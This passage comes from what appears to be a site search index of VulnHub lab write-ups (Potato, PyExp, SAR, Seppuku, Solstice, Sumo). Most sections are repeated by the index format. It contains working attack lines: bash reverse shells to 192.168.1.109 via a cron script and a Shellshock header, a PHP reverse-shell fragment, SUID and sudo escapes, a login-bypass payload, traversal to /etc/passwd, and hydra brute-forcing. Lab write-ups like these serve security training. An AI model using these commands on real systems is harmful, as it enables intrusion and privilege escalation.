{ if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we've daemonised ourself // (I can't figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?> ------WebKitFormBoundaryusjPIBaZCnX5hxKK-- We have a shell as `www-data` Go User Flag ![Pasted image 20220628192248.png](./Pasted image 20220628192248.png) ## Privilege Escalation Tried to `su` using known password for daisa, didn't work. linpeas identified `php7.2` as having the SUID bit set. This was not immediately evident, so I had to cheat by loooking up the answer on a walkthrough. Once we saw the SUID bit, we made use of [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) ```bash /usr/bin/php7.2 -r \"pcntl_exec('/bin/sh', ['-p']);\" This gives us a root shell.","title":"Port 445"},{"location":"VulnHub/Potato/","text":"Potato \u00b6 netdiscover find the box running on this IP 192.168.1.116 Port scan reveals port 80 (http) and 2112 (ftp). Found these files on ftp server index.php.bak <html> <head></head> <body> <?php $pass= \"potato\"; //note Change this password regularly if($_GET['login']===\"1\"){ if (strcmp($_POST['username'], \"admin\") == 0 && strcmp($_POST['password'], $pass) == 0) { echo \"Welcome! </br> Go to the <a href=\\\"dashboard.php\\\">dashboard</a>\"; setcookie('pass', $pass, time() + 365*24*3600); }else{ echo \"<p>Bad login/password! </br> Return to the <a href=\\\"index.php\\\">login page</a> <p>\"; } exit(); } ?> <form action=\"index.php?login=1\" method=\"POST\"> <h1>Login</h1> <label><b>User:</b></label> <input type=\"text\" name=\"username\" required> </br> <label><b>Password:</b></label> <input type=\"password\" name=\"password\" required> </br> <input type=\"submit\" id='submit' value='Login' > </form> </body> </html> and welcome.msg which didnt' have interesting content. After doing some research, we find that strcmp is not secure enough to use for login. We send the recommended payload which grants us access to the admin area We then find out a parameter which controls the logs page is vulnerable to directory traversal. WE are able to get /etc/passwd username=admin&password[]=%22%22 From that file, we get the names of 3 users which can be used to spawn a shell session: root:x:0:0:root:/root:/bin/bash florianges:x:1000:1000:florianges:/home/florianges:/bin/bash webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash We noticed the user webadmin has a hash in their entry. THis was cracked with hashcat and found to be dragon with sudo -l we found the user was allowed to run the below command as root sudo /bin/nice /notes/* we were able to use directory traversal to get an interactive bash session as root sudo /bin/nice /notes/../../../../../bin/bash -i Root flag \u00b6","title":"Potato"},{"location":"VulnHub/Potato/#potato","text":"netdiscover find the box running on this IP 192.168.1.116 Port scan reveals port 80 (http) and 2112 (ftp). Found these files on ftp server index.php.bak <html> <head></head> <body> <?php $pass= \"potato\"; //note Change this password regularly if($_GET['login']===\"1\"){ if (strcmp($_POST['username'], \"admin\") == 0 && strcmp($_POST['password'], $pass) == 0) { echo \"Welcome! </br> Go to the <a href=\\\"dashboard.php\\\">dashboard</a>\"; setcookie('pass', $pass, time() + 365*24*3600); }else{ echo \"<p>Bad login/password! </br> Return to the <a href=\\\"index.php\\\">login page</a> <p>\"; } exit(); } ?> <form action=\"index.php?login=1\" method=\"POST\"> <h1>Login</h1> <label><b>User:</b></label> <input type=\"text\" name=\"username\" required> </br> <label><b>Password:</b></label> <input type=\"password\" name=\"password\" required> </br> <input type=\"submit\" id='submit' value='Login' > </form> </body> </html> and welcome.msg which didnt' have interesting content. After doing some research, we find that strcmp is not secure enough to use for login. We send the recommended payload which grants us access to the admin area We then find out a parameter which controls the logs page is vulnerable to directory traversal. WE are able to get /etc/passwd username=admin&password[]=%22%22 From that file, we get the names of 3 users which can be used to spawn a shell session: root:x:0:0:root:/root:/bin/bash florianges:x:1000:1000:florianges:/home/florianges:/bin/bash webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash We noticed the user webadmin has a hash in their entry. THis was cracked with hashcat and found to be dragon with sudo -l we found the user was allowed to run the below command as root sudo /bin/nice /notes/* we were able to use directory traversal to get an interactive bash session as root sudo /bin/nice /notes/../../../../../bin/bash -i","title":"Potato"},{"location":"VulnHub/Potato/#root-flag","text":"","title":"Root flag"},{"location":"VulnHub/PyExp/","text":"PyExp \u00b6 we found the IP netdiscover 192.168.1.151 a port scan shows port 1337 (ssh) and 3306 (mysql 5.5.5) we were able to get the root user's password with a dictionary attack via hydra. hydra -L scans/users -P /usr/share/wordlists/rockyou.txt 192.168.1.151 mysql -t4 -vv we were able to read arbitrary files with mysql select file_read('/etc/passwd'); root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin lucy:x:1000:1000:lucy,,,:/home/lucy:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false we also found some encrypted data in the data.fernet table. using the following python, we were able to decrypt it. encrypted = b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=' key = b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=' # Decryption from cryptography.fernet import Fernet f = Fernet(key) decrypted = f.decrypt(encrypted) print(\"Decrypted message: \") print(decrypted.decode('utf-8')) Our decrypted message is lucy:wJ9`\"Lemdv9[FEw- so user lucy and password is: wJ9`\"Lemdv9[FEw- this user can run /opt/exp.py as root with no password. we checked the source code of exp.py uinput = raw_input('how are you?') exec(uinput) This means we have direct python execution as the root user. We can abuse this in the following way: run exp.py with sudo sudo /usr/bin/python2 /opt/exp.py provide this malicious input which spawns a root bash session. import os; os.setuid(0); os.system(\"/bin/bash\") Root flag \u00b6","title":"PyExp"},{"location":"VulnHub/PyExp/#pyexp","text":"we found the IP netdiscover 192.168.1.151 a port scan shows port 1337 (ssh) and 3306 (mysql 5.5.5) we were able to get the root user's password with a dictionary attack via hydra. hydra -L scans/users -P /usr/share/wordlists/rockyou.txt 192.168.1.151 mysql -t4 -vv we were able to read arbitrary files with mysql select file_read('/etc/passwd'); root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin lucy:x:1000:1000:lucy,,,:/home/lucy:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false we also found some encrypted data in the data.fernet table. using the following python, we were able to decrypt it. encrypted = b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=' key = b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=' # Decryption from cryptography.fernet import Fernet f = Fernet(key) decrypted = f.decrypt(encrypted) print(\"Decrypted message: \") print(decrypted.decode('utf-8')) Our decrypted message is lucy:wJ9`\"Lemdv9[FEw- so user lucy and password is: wJ9`\"Lemdv9[FEw- this user can run /opt/exp.py as root with no password. we checked the source code of exp.py uinput = raw_input('how are you?') exec(uinput) This means we have direct python execution as the root user. We can abuse this in the following way: run exp.py with sudo sudo /usr/bin/python2 /opt/exp.py provide this malicious input which spawns a root bash session. import os; os.setuid(0); os.system(\"/bin/bash\")","title":"PyExp"},{"location":"VulnHub/PyExp/#root-flag","text":"","title":"Root flag"},{"location":"VulnHub/SAR/","text":"Sar \u00b6 netdiscover found the VM on this IP 192.168.1.145 Port 80 \u00b6 Port scan reveals port 80 is running apache web server. The home page is just default apache site. Php INFO \u00b6 We found PHP info at /phpinfo.php robots.txt \u00b6 We found an entry: sar2HTML in robots.txt sar2HTML \u00b6 The software version is displayed on home page. we found EDB-49344 which gives us RCE as www-data Privesc \u00b6 linpeas.sh found an intersting entry in crontab Unfortunately, we can't modify finally.sh . But the contents of finally.sh #!/bin/sh ./write.sh leads us to a file we can modify: write.sh we replace the existing file with a malicious script: #!/bin/bash bash -i >& /dev/tcp/192.168.1.109/443 0>&1 Root flag \u00b6 And we got root!","title":"Sar"},{"location":"VulnHub/SAR/#sar","text":"netdiscover found the VM on this IP 192.168.1.145","title":"Sar"},{"location":"VulnHub/SAR/#port-80","text":"Port scan reveals port 80 is running apache web server. The home page is just default apache site.","title":"Port 80"},{"location":"VulnHub/SAR/#php-info","text":"We found PHP info at /phpinfo.php","title":"Php INFO"},{"location":"VulnHub/SAR/#robotstxt","text":"We found an entry: sar2HTML in robots.txt","title":"robots.txt"},{"location":"VulnHub/SAR/#sar2html","text":"The software version is displayed on home page. we found EDB-49344 which gives us RCE as www-data","title":"sar2HTML"},{"location":"VulnHub/SAR/#privesc","text":"linpeas.sh found an intersting entry in crontab Unfortunately, we can't modify finally.sh . But the contents of finally.sh #!/bin/sh ./write.sh leads us to a file we can modify: write.sh we replace the existing file with a malicious script: #!/bin/bash bash -i >& /dev/tcp/192.168.1.109/443 0>&1","title":"Privesc"},{"location":"VulnHub/SAR/#root-flag","text":"And we got root!","title":"Root flag"},{"location":"VulnHub/Seppuku/","text":"Seppuku \u00b6 netdiscover found the box running on this IP 192.168.1.181 Port scan \u00b6 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhKnaNVJ/YnScPD1GDZSIfyC/a4jjHhSnoEgi2c/c03kE4JVZbA4cTFeEHGq4PFTyiuchv9w9zNu8XtVIDhILb9K4D38EssujmpekrrAnYkS0yU8Kqas1+3FCY8xjz6a5yVdMk/aQVa4BfFXWnv+rdlio0ZFVdLDaRaG90KMUEVw18Ogzt9lBbnbf7gOR0EGPKW0xzyDyI70u5FJnarDFV9jCZL/flcCL0m+MAycgdFyFqCOTjNxd8Qn2R3rnhgjSER5C9c+qEI/htLmtnXTC0p6AMeTDjO3J57LEB1WFYJ4wkeuEUtPadfhwgDR16XqWmqw2HcBIj1W9H9V47KFfR | 256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+yj9GRgyn2boC7Dw9un6PEwviM8NZ1CRTjmrHRFiOT+0co+OOwxD5RRQCxuS22zJgsiDIEka8ypTjYWlnJ9T8= | 256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESejQ038eElmlRfbqAgaRSK120jvrz9WQ5UcjxJdJ71 80/tcp open http syn-ack ttl 64 nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: 401 Authorization Required | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Restricted Content 139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 8088/tcp open http syn-ack ttl 64 LiteSpeed httpd |_http-server-header: LiteSpeed |_http-title: Seppuku | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS MAC Address: 00:0C:29:B1:65:81 (VMware) Enumeration \u00b6 We weren't able to anonymous login with ftp Port 80 requires authentication, we tried a few basic combinations such as - admin:admin - admin:password - root:root - root:password Anonymous login wasn't allowed on the Samba Share Port 8088 didn't have anything interesting we found some interesting files We were able to crack the shadow.bak file pretty quickly with hashcat and the supplied wordlist. However, the username is rabbit-hole and these credentials don't appear to work anywhere. We also tried using some RSA tokens that we found in /keys/ This also led nowhere. Next I threw the password list at ssh using the hostname of the box as the user (this has been a common pattern in the past). hydra -l 'seppuku' -P ../loot/password.lst 192.168.1.181 ssh This gives us a way in seppuku eeyoree Privesc \u00b6 We start with some manual enumeration, and notice the user is able to run /usr/bin/ln -sf /root/ /tmp/ as root with no password. Running the command copies the whole /root/ directory into /tmp so we can view the files. sudo /usr/bin/ln -sf /root/ /tmp/ we then try to move to the folder to see the files cd /tmp we see we're in a restricted rbash session we can easily escape this with bash -i but we don't have permissions to view the /tmp/root directory Linpeas \u00b6 at this point we decided to turn to linpeas, here are some of the findings sudo version 1.8.27 \u00b6 nginx htpasswd \u00b6 admin:$apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1 Hashcat and crackstation didn't automatically recognize this hash type, though we were able to see it's similar to Apache which is mode 1600 on the example hashes page we also needed to modify the hash file so it only contained the hash and NOT the username: $apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1 hashcat -m 1600 hash password.lst credentials admin Football id_rsa.pub \u00b6 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKkmXCMpd/QXhi8vaB/C+hS68Ht+4Ywx8J7jWAsKxOyV45TLYIlf6g3BVUo+mXpNgjidc8ZuLB8bOjGbQVlrsP3K vzc6DC68wynzc6RVzAv2/7Htq0rwABVnQ2O848aS8SEHas9LaYqDXFEpcIzukDQpI6gNuT1yg6lp2ODgbR/Vg9avCnqIt8gSt9jb7mFLtDJNCm5GYe5Hh4osXU0VGn yBi40JW2vSfZS7qFa4jtFYEZBkkmiPwsqN9FFiYoanKqIZN1HL7zILIC5PnmyG4LNe5z7/ccTaMAI4Pz6lI8qPDHObh+5pJ8FNSQd/KGJIoiSinZh8gMspE8zx0afn O5 This gives an idea to try to private key we found earlier for this user. It works! lateral movement to user: tanto \u00b6 ssh -i private tanto@192.168.1.181 This user was also in a restricted shell, we need to escape with bash -i after some manual enumeration and running linpeas, it doesn't appear that we have any new permissions as this user users with console \u00b6 interesting files in home directory \u00b6 12345685213456!@!@A Turns out, this is a clear-text backup of a password for the user samurai su samurai paste the password samurai is allowed to run the following with elevated privileges /../../../../../../home/tanto/.cgi_bin/bin /tmp/* after reviewing linpeas results, it appears the only access gained was the above sudo command. I tried running the command, but the path /home/tanto/.gci_bin/bin does not exist. Since we have access as tanto through an ssh-key, we log in and create a copy of ls at that path ssh -i private tanto@192.168.1.181 break out of rbash bash -i copy the ls binary mkdir /home/tanto/.cgi_bin/ && cp /usr/bin/ls $HOME/.cgi_bin/bin then, in a different shell running as samurai , run the binary with sudo and ls the /tmp/root directory sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root we see root.txt , but lets try to get a session as root. I wonder if there are any ssh keys. sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/.ssh now, we can view the key by replacing our sudo binary with the cat command, again running in a session as the tanto user mkdir /home/tanto/.cgi_bin/ && cp /usr/bin/cat $HOME/.cgi_bin/bin sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/.ssh/id_rsa > root_rsa we then copy the file over to our kali box. the rsa key worked! We're able to log in as root now using ssh. ssh -i root_rsa root@192.168.1.181 Root flag \u00b6 {SunCSR_Seppuku_2020_X}","title":"Seppuku"},{"location":"VulnHub/Seppuku/#seppuku","text":"netdiscover found the box running on this IP 192.168.1.181","title":"Seppuku"},{"location":"VulnHub/Seppuku/#port-scan","text":"PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhKnaNVJ/YnScPD1GDZSIfyC/a4jjHhSnoEgi2c/c03kE4JVZbA4cTFeEHGq4PFTyiuchv9w9zNu8XtVIDhILb9K4D38EssujmpekrrAnYkS0yU8Kqas1+3FCY8xjz6a5yVdMk/aQVa4BfFXWnv+rdlio0ZFVdLDaRaG90KMUEVw18Ogzt9lBbnbf7gOR0EGPKW0xzyDyI70u5FJnarDFV9jCZL/flcCL0m+MAycgdFyFqCOTjNxd8Qn2R3rnhgjSER5C9c+qEI/htLmtnXTC0p6AMeTDjO3J57LEB1WFYJ4wkeuEUtPadfhwgDR16XqWmqw2HcBIj1W9H9V47KFfR | 256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+yj9GRgyn2boC7Dw9un6PEwviM8NZ1CRTjmrHRFiOT+0co+OOwxD5RRQCxuS22zJgsiDIEka8ypTjYWlnJ9T8= | 256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESejQ038eElmlRfbqAgaRSK120jvrz9WQ5UcjxJdJ71 80/tcp open http syn-ack ttl 64 nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: 401 Authorization Required | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Restricted Content 139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 8088/tcp open http syn-ack ttl 64 LiteSpeed httpd |_http-server-header: LiteSpeed |_http-title: Seppuku | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS MAC Address: 00:0C:29:B1:65:81 (VMware)","title":"Port scan"},{"location":"VulnHub/Seppuku/#enumeration","text":"We weren't able to anonymous login with ftp Port 80 requires authentication, we tried a few basic combinations such as - admin:admin - admin:password - root:root - root:password Anonymous login wasn't allowed on the Samba Share Port 8088 didn't have anything interesting we found some interesting files We were able to crack the shadow.bak file pretty quickly with hashcat and the supplied wordlist. However, the username is rabbit-hole and these credentials don't appear to work anywhere. We also tried using some RSA tokens that we found in /keys/ This also led nowhere. Next I threw the password list at ssh using the hostname of the box as the user (this has been a common pattern in the past). hydra -l 'seppuku' -P ../loot/password.lst 192.168.1.181 ssh This gives us a way in seppuku eeyoree","title":"Enumeration"},{"location":"VulnHub/Seppuku/#privesc","text":"We start with some manual enumeration, and notice the user is able to run /usr/bin/ln -sf /root/ /tmp/ as root with no password. Running the command copies the whole /root/ directory into /tmp so we can view the files. sudo /usr/bin/ln -sf /root/ /tmp/ we then try to move to the folder to see the files cd /tmp we see we're in a restricted rbash session we can easily escape this with bash -i but we don't have permissions to view the /tmp/root directory","title":"Privesc"},{"location":"VulnHub/Seppuku/#linpeas","text":"at this point we decided to turn to linpeas, here are some of the findings","title":"Linpeas"},{"location":"VulnHub/Seppuku/#sudo-version-1827","text":"","title":"sudo version 1.8.27"},{"location":"VulnHub/Seppuku/#nginx-htpasswd","text":"admin:$apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1 Hashcat and crackstation didn't automatically recognize this hash type, though we were able to see it's similar to Apache which is mode 1600 on the example hashes page we also needed to modify the hash file so it only contained the hash and NOT the username: $apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1 hashcat -m 1600 hash password.lst credentials admin Football","title":"nginx htpasswd"},{"location":"VulnHub/Seppuku/#id_rsapub","text":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKkmXCMpd/QXhi8vaB/C+hS68Ht+4Ywx8J7jWAsKxOyV45TLYIlf6g3BVUo+mXpNgjidc8ZuLB8bOjGbQVlrsP3K vzc6DC68wynzc6RVzAv2/7Htq0rwABVnQ2O848aS8SEHas9LaYqDXFEpcIzukDQpI6gNuT1yg6lp2ODgbR/Vg9avCnqIt8gSt9jb7mFLtDJNCm5GYe5Hh4osXU0VGn yBi40JW2vSfZS7qFa4jtFYEZBkkmiPwsqN9FFiYoanKqIZN1HL7zILIC5PnmyG4LNe5z7/ccTaMAI4Pz6lI8qPDHObh+5pJ8FNSQd/KGJIoiSinZh8gMspE8zx0afn O5 This gives an idea to try to private key we found earlier for this user. It works!","title":"id_rsa.pub"},{"location":"VulnHub/Seppuku/#lateral-movement-to-user-tanto","text":"ssh -i private tanto@192.168.1.181 This user was also in a restricted shell, we need to escape with bash -i after some manual enumeration and running linpeas, it doesn't appear that we have any new permissions as this user","title":"lateral movement to user: tanto"},{"location":"VulnHub/Seppuku/#users-with-console","text":"","title":"users with console"},{"location":"VulnHub/Seppuku/#interesting-files-in-home-directory","text":"12345685213456!@!@A Turns out, this is a clear-text backup of a password for the user samurai su samurai paste the password samurai is allowed to run the following with elevated privileges /../../../../../../home/tanto/.cgi_bin/bin /tmp/* after reviewing linpeas results, it appears the only access gained was the above sudo command. I tried running the command, but the path /home/tanto/.gci_bin/bin does not exist. Since we have access as tanto through an ssh-key, we log in and create a copy of ls at that path ssh -i private tanto@192.168.1.181 break out of rbash bash -i copy the ls binary mkdir /home/tanto/.cgi_bin/ && cp /usr/bin/ls $HOME/.cgi_bin/bin then, in a different shell running as samurai , run the binary with sudo and ls the /tmp/root directory sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root we see root.txt , but lets try to get a session as root. I wonder if there are any ssh keys. sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/.ssh now, we can view the key by replacing our sudo binary with the cat command, again running in a session as the tanto user mkdir /home/tanto/.cgi_bin/ && cp /usr/bin/cat $HOME/.cgi_bin/bin sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/.ssh/id_rsa > root_rsa we then copy the file over to our kali box. the rsa key worked! We're able to log in as root now using ssh. ssh -i root_rsa root@192.168.1.181","title":"interesting files in home directory"},{"location":"VulnHub/Seppuku/#root-flag","text":"{SunCSR_Seppuku_2020_X}","title":"Root flag"},{"location":"VulnHub/Solstice/","text":"Solstice \u00b6 netdiscover found the VM runnin on this IP 192.168.1.191 Service enumeration \u00b6 Pyftpdlib 1.5.6 ports 21 and 2121 \u00b6 tested anonymous (ftp:ftp) login - didn't work. Exim smtp 4.9.2 \u00b6 THis is running on port 25; we didn't find any valid accounts with vrfy wordlist attack. Squid httpd proxy 4.6 \u00b6 This is running on port 3128. We didn't see any webpages accessible from this port. http webservices \u00b6 port 80, 8593, and 54787 have web services. Port 80 has version disclosure on the homepage on port 54787 nikto found the following page http://192.168.1.191:54787/project/index.php This is a login page, we were able to guess the credentials username admin password admin at this point, we checked in with a walkthrough and it looks like we were possibly stuck in a rabbit hole http://192.168.1.191:8593/index.php?book= is vulnerable to LFI We poisoned the logs with some php, then got a shell as www-data we're able to see an interesting process running as root /var/tmp/sv We modified the index.php page to contain a reverse shell then catch it with a netcat listener Root flag \u00b6","title":"Solstice"},{"location":"VulnHub/Solstice/#solstice","text":"netdiscover found the VM runnin on this IP 192.168.1.191","title":"Solstice"},{"location":"VulnHub/Solstice/#service-enumeration","text":"","title":"Service enumeration"},{"location":"VulnHub/Solstice/#pyftpdlib-156-ports-21-and-2121","text":"tested anonymous (ftp:ftp) login - didn't work.","title":"Pyftpdlib 1.5.6 ports 21 and 2121"},{"location":"VulnHub/Solstice/#exim-smtp-492","text":"THis is running on port 25; we didn't find any valid accounts with vrfy wordlist attack.","title":"Exim smtp 4.9.2"},{"location":"VulnHub/Solstice/#squid-httpd-proxy-46","text":"This is running on port 3128. We didn't see any webpages accessible from this port.","title":"Squid httpd proxy 4.6"},{"location":"VulnHub/Solstice/#http-webservices","text":"port 80, 8593, and 54787 have web services. Port 80 has version disclosure on the homepage on port 54787 nikto found the following page http://192.168.1.191:54787/project/index.php This is a login page, we were able to guess the credentials username admin password admin at this point, we checked in with a walkthrough and it looks like we were possibly stuck in a rabbit hole http://192.168.1.191:8593/index.php?book= is vulnerable to LFI We poisoned the logs with some php, then got a shell as www-data we're able to see an interesting process running as root /var/tmp/sv We modified the index.php page to contain a reverse shell then catch it with a netcat listener","title":"http webservices"},{"location":"VulnHub/Solstice/#root-flag","text":"","title":"Root flag"},{"location":"VulnHub/Sumo/","text":"Sumo \u00b6 netdiscover found this box running on the following IP 192.168.1.104 nikto identified shellshock We are able to get a reverse shell as www-data using the following web request. GET /cgi-bin/test.sh HTTP/1.1 Host: 192.168.1.104 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Accept: () { :;}; /bin/bash -i >& /dev/tcp/192.168.1.109/4444 0>&1 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close linpeas and linux-exploit-suggester both identified dirtycow as a possible privesc avenue. I was struggling to get the exploit compiled, as I was getting an error: gcc: error trying to exec 'cc1': execvp: No such file or directory I turned to a walkthrough to see what I might be missing. And we found a way to fix the error: PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/:/usr/bin;export PATH We were able to get a root shell using dirtycow EDB-40839 Root flag \u00b6","title":"Sumo"},{"location":"VulnHub/Sumo/#sumo","text":"netdiscover found this box running on the following IP 192.168.1.104 nikto identified shellshock We are able to get a reverse shell as www-data using the following web request. GET /cgi-bin/test.sh HTTP/1.1 Host: 192.168.1.104 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Accept: () { :;}; /bin/bash -i >& /dev/tcp/192.168.1.109/4444 0>&1 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close linpeas and linux-exploit-suggester both identified dirtycow as a possible privesc avenue. I was struggling to get the exploit compiled, as I was getting an error: gcc: error trying to exec 'cc1': execvp: No such file or directory I turned to a walkthrough to see what I might be missing. And we found a way to fix the error: PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/:/usr/bin;export PATH We were able to get a root shell using dirtycow EDB-40839","title":"Sumo"},{"location":"VulnHub/Sumo/#root-flag","text":"","title":"Root flag"},{"location":"VulnHub/Vegeta/","text":"Vegeta \u00b6 netdiscover finds this IP 192.168.1.113 autorecon finds port 22 and port 80. we found an entry in robots.txt and followed it This brings us to a page with some encoded 